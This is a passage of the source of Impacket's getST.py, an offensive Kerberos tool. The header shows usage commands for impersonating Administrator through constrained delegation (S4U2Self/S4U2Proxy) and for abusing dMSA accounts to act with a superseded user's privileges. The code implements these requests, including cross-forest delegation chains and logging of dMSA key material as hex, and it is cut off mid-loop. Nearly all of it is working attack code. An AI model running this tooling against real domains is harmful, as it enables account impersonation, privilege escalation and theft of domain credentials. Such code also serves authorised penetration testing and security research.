#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies 
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Given a password, hash, aesKey or TGT in ccache, it will request a Service Ticket and save it as ccache
#   If the account has constrained delegation (with protocol transition) privileges you will be able to use
#   the -impersonate switch to request the ticket on behalf other user (it will use S4U2Self/S4U2Proxy to
#   request the ticket.)
#
#   Similar feature has been implemented already by Benjamin Delpy (@gentilkiwi) in Kekeo (s4u)
#
#   Examples:
#       ./getST.py -hashes lm:nt -spn cifs/contoso-dc contoso.com/user
#   or
#   If you have tickets cached (run klist to verify) the script will use them
#         ./getST.py -k -spn cifs/contoso-dc contoso.com/user
#   Be sure tho, that the cached TGT has the forwardable flag set (klist -f). getTGT.py will ask forwardable tickets
#   by default.
#
#   Also, if the account is configured with constrained delegation (with protocol transition) you can request
#   service tickets for other users, assuming the target SPN is allowed for delegation:
#         ./getST.py -k -impersonate Administrator -spn cifs/contoso-dc contoso.com/user
#
#   The output of this script will be a service ticket for the Administrator user.
#
#   Implemented by @fulc2um: you can request a ticket for dMSA account and use it for code execution with privileges of superseded user.
#   Microsoft documentation for setting up Delegated Managed Service Accounts (dMSA): 
#   https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa
#   Assume that dMSA account dmsa$ is dMSA account and Administrator is superseded account:
#         ./getST.py -k -no-pass -impersonate dmsa$ -self -dmsa contoso.com/user
#
#   Once you have the ccache file, set it in the KRB5CCNAME variable and use it for fun and profit.
#
# Authors:
#   Alberto Solino (@agsolino)
#   Charlie Bromberg (@_nwodtuhs)
#   Martin Gallo (@MartinGalloAr)
#   Dirk-jan Mollema (@_dirkjan)
#   Elad Shamir (@elad_shamir)
#   @snovvcrash
#   Leandro (@0xdeaddood)
#   Jake Karnes (@jakekarnes42)

from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import os
import random
import struct
import sys
from binascii import hexlify, unhexlify
from six import ensure_binary

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_identity
from impacket.krb5 import constants, types, crypto, ccache
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart, S4UUserID, PA_S4U_X509_USER, KERB_DMSA_KEY_PACKAGE
from impacket.krb5.ccache import CCache, Credential
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, _AES256CTS, Enctype, string_to_key, _get_checksum_profile, Cksumtype
from impacket.krb5.constants import TicketFlags, encodeFlags, ApplicationTagNumbers
from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.ntlm import compute_nthash
from impacket.winregistry import hexdump

class GETST:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.__proxydc = options.proxydc
        self.__proxydomain = options.proxydomain
        self.__impersonatedc = options.impersonatedc
        if options.impersonate != None:
            self.__impersonatedomain = options.impersonate.split('@')[1]
            self.__impersonateuser = options.impersonate.split('@')[0]
            # Populate DCs
            if not options.proxy and self.__domain == self.__impersonatedomain:
                if self.__kdcHost == None and self.__impersonatedc != None:
                    self.__kdcHost = self.__impersonatedc
                if self.__impersonatedc == None and self.__kdcHost != None:
                    self.__impersonatedc = self.__kdcHost
            if not options.self and self.__domain == self.__proxydomain:
                if self.__kdcHost == None and self.__proxydc != None:
                    self.__kdcHost = self.__proxydc
                if self.__proxydc == None and self.__kdcHost != None:
                    self.__proxydc = self.__kdcHost
        else:
            self.__impersonatedomain = None
        self.__force_forwardable = options.force_forwardable
        self.__additional_ticket = options.additional_ticket
        self.__dmsa = options.dmsa
        self.__saveFileName = None
        self.__self = options.self
        self.__u2u = options.u2u
        self.__proxy = options.proxy
        self.__forest = options.forest
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def saveTicket(self, ticket, sessionKey):
        ccache = CCache()
        if self.__options.altservice is not None:
            decodedST = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
            sname = decodedST['ticket']['sname']['name-string']
            if len(decodedST['ticket']['sname']['name-string']) == 1:
                logging.debug("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution service will fail")
                logging.debug("Original sname is: %s" % sname[0])
                if '/' not in self.__options.altservice:
                    raise ValueError("Substitution service must include service class AND name (i.e. CLASS/HOSTNAME@REALM, or CLASS/HOSTNAME)")
                service_class, service_hostname = ('', sname[0])
                service_realm = decodedST['ticket']['realm']
            elif len(decodedST['ticket']['sname']['name-string']) == 2:
                service_class, service_hostname = decodedST['ticket']['sname']['name-string']
                service_realm = decodedST['ticket']['realm']
            else:
                logging.debug("Original sname is: %s" % '/'.join(sname))
                raise ValueError("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), something's wrong here...")
            if '@' in self.__options.altservice:
                new_service_realm = self.__options.altservice.split('@')[1].upper()
                if not '.' in new_service_realm:
                    logging.debug("New service realm is not FQDN, you may encounter errors")
                if '/' in self.__options.altservice:
                    new_service_hostname = self.__options.altservice.split('@')[0].split('/')[1]
                    new_service_class = self.__options.altservice.split('@')[0].split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = self.__options.altservice.split('@')[0]
            else:
                logging.debug("No service realm in new SPN, using the current one (%s)" % service_realm)
                new_service_realm = service_realm
                if '/' in self.__options.altservice:
                    new_service_hostname = self.__options.altservice.split('/')[1]
                    new_service_class = self.__options.altservice.split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = self.__options.altservice
            if len(service_class) == 0:
                current_service = "%s@%s" % (service_hostname, service_realm)
            else:
                current_service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            new_service = "%s/%s@%s" % (new_service_class, new_service_hostname, new_service_realm)
            self.__saveFileName += "@" + new_service.replace("/", "_")
            logging.info('Changing service from %s to %s' % (current_service, new_service))
            # the values are changed in the ticket
            decodedST['ticket']['sname']['name-string'][0] = new_service_class
            decodedST['ticket']['sname']['name-string'][1] = new_service_hostname
            decodedST['ticket']['realm'] = new_service_realm
            ticket = encoder.encode(decodedST)
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            # the values need to be changed in the ccache credentials
            # we already checked everything above, we can simply do the second replacement here
            for creds in ccache.credentials:
                creds['server'].fromPrincipal(Principal(new_service, type=constants.PrincipalNameType.NT_PRINCIPAL.value))
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            creds = ccache.credentials[0]
            service_realm = creds['server'].realm['data']
            service_class = ''
            if len(creds['server'].components) == 2:
                service_class = creds['server'].components[0]['data']
                service_hostname = creds['server'].components[1]['data']
            else:
                service_hostname = creds['server'].components[0]['data']
            if len(service_class) == 0:
                service = "%s@%s" % (service_hostname, service_realm)
            else:
                service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            self.__saveFileName += "@" + service.replace("/", "_")
        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U2Proxy(self, tgt, cipher, sessionKey, targetSPN, additionalTicket, branchAware, forest, nextDomain, nextKDC, noRec = False):
        # Extract TGT from AS-REP or TGS-REP for cross-realm request
        
        try:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        except:
            decodedTGT = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        if additionalTicket != None and not branchAware:
            logging.info(f"Using additional ticket")

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation[+ branch-aware] support
        paPacOptions = PA_PAC_OPTIONS()
        if branchAware:
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,
                                                           constants.PAPacOptions.branch_aware.value))
        else:
            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        if additionalTicket != None and not branchAware:
            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(targetSPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = nextDomain
        if additionalTicket != None and not branchAware:
            seq_set_iter(reqBody, 'additional-tickets', (additionalTicket.to_asn1(TicketAsn1()),))

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                        (
                            int(constants.EncryptionTypes.rc4_hmac.value),
                            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                            int(constants.EncryptionTypes.des_cbc_md5.value),
                            int(cipher.enctype)
                        )
                        )
        
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        message = encoder.encode(tgsReq)

        logging.info('Requesting S4U2Proxy%s to %s' % (' with branch-aware' if branchAware else '', nextKDC))
        r = sendReceive(message, nextDomain, nextKDC)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        spn = Principal()
        spn.from_asn1(tgs['ticket'], 'realm', 'sname')

        # Parse TGS

        cipherText = tgs['enc-part']['cipher']
        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)
        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'].asOctets())
        newCipher = _enctype_table[int(encTGSRepPart['key']['keytype'])]

        # Check if we get the requested serviceName: If not this is for another KDC

        if str(spn).split('@')[0].lower() == targetSPN.lower() or noRec:
            return r, newCipher, sessionKey, newSessionKey
        else:
            if branchAware:
                return r, newCipher, sessionKey, newSessionKey
            
            # It is not a S4U2Proxy+BranchAware request
		    # Send subsequent requests

            if forest:

                prevDomain = nextDomain
                nextDomain = spn.components[1].upper()
                initialNextDomain = nextDomain
                oneHop = True

                # For next cross-realm domain inside another forest
			    # Do S4U2Proxy+BranchAware first
                
                tgtBA, cipherBA, oldSessionKeyBA, newSessionKeyBA = self.doS4U2Proxy(tgt, cipher, sessionKey, targetSPN, None, True, True, prevDomain, nextKDC)
                tgs = decoder.decode(tgtBA, asn1Spec=TGS_REP())[0]
                if logging.getLogger().level == logging.DEBUG:
                    logging.debug('TGS_REP')
                    print(tgs.prettyPrint())

                # Retrieve recursively ST use as TGT for final S4U2Proxy = last TGS-REQ/S4U2Proxy or first S4U2Proxy+BranchAware for targetSPN

                while True:

                    # 1: TGS-REQ with S4U2Proxy+BranchAware TGT then previous S4U2Proxy

                    if nextDomain.lower() == self.__proxydomain.lower() and self.__proxydc is not None:
                        nextKDC = self.__proxydc
                    else:
                        nextKDC = nextDomain

                    logging.info(f'Requesting TGS-REQ for {targetSPN} to {nextKDC}')
                    if oneHop:
                        tgtNextDomain1, cipherNextDomain1, oldSessionKeyNextDomain1, newSessionKeyNextDomain1 = getKerberosTGS(Principal(targetSPN,
                                                                        type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                        nextDomain, nextKDC, tgtBA, cipherBA, newSessionKeyBA, noRec = True)
                    else:
                        tgtNextDomain1, cipherNextDomain1, oldSessionKeyNextDomain1, newSessionKeyNextDomain1 = getKerberosTGS(Principal(targetSPN,
                                                                        type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                        nextDomain, nextKDC, tgtNextDomain2, cipherNextDomain2,
                                                                        newSessionKeyNextDomain2, noRec = True)

                    tgs = decoder.decode(tgtNextDomain1, asn1Spec=TGS_REP())[0]
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('TGS_REP')
                        print(tgs.prettyPrint())
                    spn = Principal()
                    spn.from_asn1(tgs['ticket'], 'realm', 'sname')
                    
                    if str(spn).split('@')[0].lower() == targetSPN.lower():
                        if oneHop:
                            tgtPrev = tgtBA
                            cipherPrev = cipherBA
                            oldSessionKeyPrev = oldSessionKeyBA
                            newSessionKeyPrev = newSessionKeyBA
                        else:
                            tgtPrev = tgtNextDomain2
                            cipherPrev = cipherNextDomain2
                            oldSessionKeyPrev = oldSessionKeyNextDomain2
                            newSessionKeyPrev = newSessionKeyNextDomain2
                        break
                    else:
                        prevDomain = nextDomain
                        nextDomain = spn.components[1].upper()

                    oneHop = False

                    # 2: S4U2Proxy with previous TGT

                    if nextDomain.lower() == self.__proxydomain.lower() and self.__proxydc is not None:
                        nextKDC = self.__proxydc
                    else:
                        nextKDC = nextDomain

                    tgtNextDomain2, cipherNextDomain2, oldSessionKeyNextDomain2, newSessionKeyNextDomain2 = self.doS4U2Proxy(tgtNextDomain1, cipherNextDomain1,
                                                                                                            newSessionKeyNextDomain1, targetSPN, None, False,
                                                                                                            True, nextDomain, nextKDC, noRec = True)
                    
                    tgs = decoder.decode(tgtNextDomain2, asn1Spec=TGS_REP())[0]
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('TGS_REP')
                        print(tgs.prettyPrint())
                    spn = Principal()
                    spn.from_asn1(tgs['ticket'], 'realm', 'sname')
                    
                    if str(spn).split('@')[0].lower() == targetSPN.lower():
                        tgtPrev = tgtNextDomain1
                        cipherPrev = cipherNextDomain1
                        oldSessionKeyPrev = oldSessionKeyNextDomain1
                        newSessionKeyPrev = newSessionKeyNextDomain1
                        break
                    else:
                        prevDomain = nextDomain
                        nextDomain = spn.components[1].upper()

                # We have the ST as TGT for final S4U2Proxy
                # Retrieve recursively the additional ticket for final S4U2Proxy = last S4U2Proxy for krbtgt/self.__proxydomain
                # OR first S4U2Proxy for targetSPN with Additional Ticket = S4U2Self

                if not oneHop:

                    tgtAddTicket = r
                    cipherAddTicket = newCipher
                    newSessionKeyAddTicket = newSessionKey

                    prevDomain = initialNextDomain

                    while prevDomain.lower() != nextDomain.lower():

                        if prevDomain.lower() == self.__proxydomain.lower() and self.__proxydc is not None:
                            nextKDC = self.__proxydc
                        else:
                            nextKDC = prevDomain

                        tgtAddTicket, cipherAddTicket, oldSessionKeyAddTicket, newSessionKeyAddTicket = self.doS4U2Proxy(tgtAddTicket, cipherAddTicket,
                                                                            newSessionKeyAddTicket, f"krbtgt/{self.__proxydomain.upper()}",
                                                                            None, False, True, prevDomain, nextKDC, noRec = True)
                        
                        tgs = decoder.decode(tgtAddTicket, asn1Spec=TGS_REP())[0]
                        if logging.getLogger().level == logging.DEBUG:
                            logging.debug('TGS_REP')
                            print(tgs.prettyPrint())
                        additionalTicket = Ticket()
                        additionalTicket.from_asn1(tgs['ticket'])

                        spn = Principal()
                        spn.from_asn1(tgs['ticket'], 'realm', 'sname')
                        prevDomain = spn.components[1].upper()
                
                else:

                    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
                    additionalTicket = Ticket()
                    additionalTicket.from_asn1(tgs['ticket'])
                
                # Send final S4U2Proxy to self.__proxydc/self.__proxydomain

                if self.__proxydc is not None:
                    nextKDC = self.__proxydc
                else:
                    nextKDC = self.__proxydomain.upper()
                return self.doS4U2Proxy(tgtPrev, cipherPrev, newSessionKeyPrev,
                                        targetSPN, additionalTicket, False, True, nextDomain, nextKDC, noRec = True)
            
            else:

                # For next cross-realm domain inside user's forest

                # Retrieve recursively inter-realm TGT for target domain as TGT for final S4U2Proxy
                # And last S4U2proxy krbtgt/<TargetDomain> as additional ticket for final S4U2Proxy

                tgtNextDomain = tgt
                cipherNextDomain = cipher
                sessionKeyNextDomain = sessionKey
                tgtAddTicket = r
                cipherAddTicket = newCipher
                newSessionKeyAddTicket = newSessionKey
                tgs = decoder.decode(tgtAddTicket, asn1Spec=TGS_REP())[0]
                additionalTicket = Ticket()
                additionalTicket.from_asn1(tgs['ticket'])
                
                while True:

                    logging.info(f'Requesting TGS-REQ for krbtgt/{self.__proxydomain.upper()} to {nextKDC}')
                    tgtNextDomain, cipherNextDomain, _, sessionKeyNextDomain = getKerberosTGS(Principal(f"krbtgt/{self.__proxydomain.upper()}",
                                                                        type = constants.PrincipalNameType.NT_SRV_INST.value),
                                                                        nextDomain, nextKDC, tgtNextDomain, cipherNextDomain, sessionKeyNextDomain, noRec = True)
                    
                    tgs = decoder.decode(tgtNextDomain, asn1Spec=TGS_REP())[0]
                    if logging.getLogger().level == logging.DEBUG:
                        logging.debug('TGS_REP')
                        print(tgs.prettyPrint())
                    spn = Principal()
                    spn.from_asn1(tgs['ticket'], 'realm', 'sname')
                    
                    nextDomain = spn.components[1].upper()

                    if str(spn).split('@')[0].lower() == f"krbtgt/{self.__proxydomain.upper()}".lower():

                        if self.__proxydc is not None:
                            nextKDC = self.__proxydc
                        else:
                            nextKDC = nextDomain

                        return self.doS4U2Proxy(tgtNextDomain, cipherNextDomain, sessionKeyNextDomain,
                                                targetSPN, additionalTicket, False, False, nextDomain, nextKDC, noRec = True)

                    else:

                        if nextDomain.lower() == self.__proxydomain.lower() and self.__proxydc is not None:
                            nextKDC = self.__proxydc
                        else:
                            nextKDC = nextDomain

                        tgtAddTicket, cipherAddTicket, _, newSessionKeyAddTicket = self.doS4U2Proxy(tgtAddTicket, cipherAddTicket,
                                                                            newSessionKeyAddTicket, f"krbtgt/{self.__proxydomain.upper()}",
                                                                            None, False, False, nextDomain, nextKDC, noRec = True)
                        
                        tgs = decoder.decode(tgtAddTicket, asn1Spec=TGS_REP())[0]
                        additionalTicket = Ticket()
                        additionalTicket.from_asn1(tgs['ticket'])

    def doS4U2Self(self, tgt, cipher, sessionKey, additionalTicket, nthash, aesKey, nextDomain, nextKDC):
        # Extract TGT from AS-REP or TGS-REP for cross-realm request
        
        try:
            decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        except:
            decodedTGT = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        if additionalTicket != None and self.__u2u and nextDomain.lower() == self.__domain.lower():
            logging.info(f"Using additional ticket")

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__impersonateuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += ensure_binary(self.__impersonateuser) + ensure_binary(self.__impersonatedomain.upper()) + b'Kerberos'

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('S4UByteArray')
            hexdump(S4UByteArray)
        
        paencoded = None
        padatatype = None
        
        if self.__dmsa:
            nonce_value = random.getrandbits(31)
            dmsa_flags = [2, 4] # UNCONDITIONAL_DELEGATION (bit 2) | SIGN_REPLY (bit 4)
            encoded_flags = encodeFlags(dmsa_flags)
            
            s4uID = S4UUserID()
            s4uID.setComponentByName('nonce', nonce_value)
            seq_set(s4uID, 'cname', clientName.components_to_asn1)
            s4uID.setComponentByName('crealm', self.__domain) 
            s4uID.setComponentByName('options', encoded_flags)

            encoded_s4uid = encoder.encode(s4uID)
            checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
            checkSum = checksum_profile.checksum(
                sessionKey, 
                ApplicationTagNumbers.EncTGSRepPart.value,
                encoded_s4uid
            )
            if logging.getLogger().level == logging.DEBUG:
                logging.debug('CheckSum')
                hexdump(checkSum)
            s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
            s4uID_tagged.setComponentByName('nonce', nonce_value)
            seq_set(s4uID_tagged, 'cname', clientName.components_to_asn1)
            s4uID_tagged.setComponentByName('crealm', self.__domain) 
            s4uID_tagged.setComponentByName('options', encoded_flags)

            pa_s4u_x509_user = PA_S4U_X509_USER()
            pa_s4u_x509_user.setComponentByName('user-id', s4uID_tagged)
            pa_s4u_x509_user['checksum'] = noValue
            pa_s4u_x509_user['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
            pa_s4u_x509_user['checksum']['checksum'] = checkSum

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('Built PA_S4U_X509_USER for DMSA:')
                print(pa_s4u_x509_user.prettyPrint())

            padatatype = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
            paencoded = encoder.encode(pa_s4u_x509_user)
        else:
            # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
            # with the following three parameters: the session key of the TGT of
            # the service performing the S4U2Self request, the message type value
            # of 17, and the byte array S4UByteArray.
            checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('CheckSum')
                hexdump(checkSum)

            paForUserEnc = PA_FOR_USER_ENC()
            seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
            paForUserEnc['userRealm'] = self.__impersonatedomain.upper()
            paForUserEnc['cksum'] = noValue
            paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
            paForUserEnc['cksum']['checksum'] = checkSum
            paForUserEnc['auth-package'] = 'Kerberos'

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('PA_FOR_USER_ENC')
                print(paForUserEnc.prettyPrint())

            encodedPaForUserEnc = encoder.encode(paForUserEnc)
            padatatype = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
            paencoded = encodedPaForUserEnc

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = padatatype
        tgsReq['padata'][1]['padata-value'] = paencoded

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)

        if additionalTicket != None and self.__u2u and nextDomain.lower() == self.__domain.lower(): # U2U and last S4U2Self
            opts.append(constants.KDCOptions.renewable_ok.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        if self.__self and self.__options.spn is not None:
            logging.info("When doing S4U2self only, argument -spn is ignored")

        if self.__dmsa:
            serverName = Principal('krbtgt/%s' % self.__domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
            logging.debug('DMSA: Targeting krbtgt/%s service (sname)' % self.__domain)            
        else:
            serverName = Principal()
            serverName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
            serverName.components = [f"{self.__user}@{self.__domain.upper()}"]

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = nextDomain

        if additionalTicket != None and self.__u2u and nextDomain.lower() == self.__domain.lower(): # U2U and last S4U2Self
            # Add ST to additional tickets field
            seq_set_iter(reqBody, 'additional-tickets', (additionalTicket.to_asn1(TicketAsn1()),))

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        if additionalTicket != None and self.__u2u and nextDomain.lower() == self.__domain.lower(): # U2U and last S4U2Self
            encType = additionalTicket.encrypted_part.etype
        else:
            encType = cipher.enctype
        seq_set_iter(reqBody, 'etype', (tuple(dict.fromkeys((int(encType),) +
                                                            (int(constants.EncryptionTypes.rc4_hmac.value),
                                                            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                                                            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value))))))

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())
        
        message = encoder.encode(tgsReq)

        logging.info('Requesting S4U2self%s to %s' % ('+U2U' if additionalTicket != None \
                                                and self.__u2u and nextDomain.lower() == self.__domain.lower() else '',
                                                nextKDC))
        r = sendReceive(message, nextDomain, nextKDC)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        if self.__dmsa:
            try:
                # Decrypt TGS-REP enc-part (Key Usage 8 - TGS_REP_EP_SESSION_KEY)
                cipher = _enctype_table[int(tgs['enc-part']['etype'])]
                plainText = cipher.decrypt(sessionKey, 8, tgs['enc-part']['cipher'])
                encTgsRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
                
                if logging.getLogger().level == logging.DEBUG:
                    print(encTgsRepPart.prettyPrint())
                
                if 'encrypted_pa_data' not in encTgsRepPart or not encTgsRepPart['encrypted_pa_data']:
                    logging.debug('No encrypted_pa_data found - DMSA key package not present')
                    return
                    
                logging.debug('Found encrypted_pa_data, searching for DMSA key package...')
                
                for padata_entry in encTgsRepPart['encrypted_pa_data']:
                    padata_type = int(padata_entry['padata-type'])
                    logging.debug('Found encrypted padata type: %d (0x%x)' % (padata_type, padata_type))
                    
                    if padata_type == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
                        dmsa_key_package = decoder.decode(
                            padata_entry['padata-value'], 
                            asn1Spec=KERB_DMSA_KEY_PACKAGE()
                        )[0]
                        dmsa_key_package.prettyPrint()
                       
                        logging.info('Current keys:')
                        for key in dmsa_key_package['current-keys']:
                            key_type = int(key['keytype'])
                            key_value = bytes(key['keyvalue'])
                            type_name = constants.EncryptionTypes(key_type)
                            hex_key = hexlify(key_value).decode('utf-8')
                            logging.info('%s:%s' % (type_name, hex_key))
                        logging.info('Previous keys:')
                        for key in dmsa_key_package['previous-keys']:
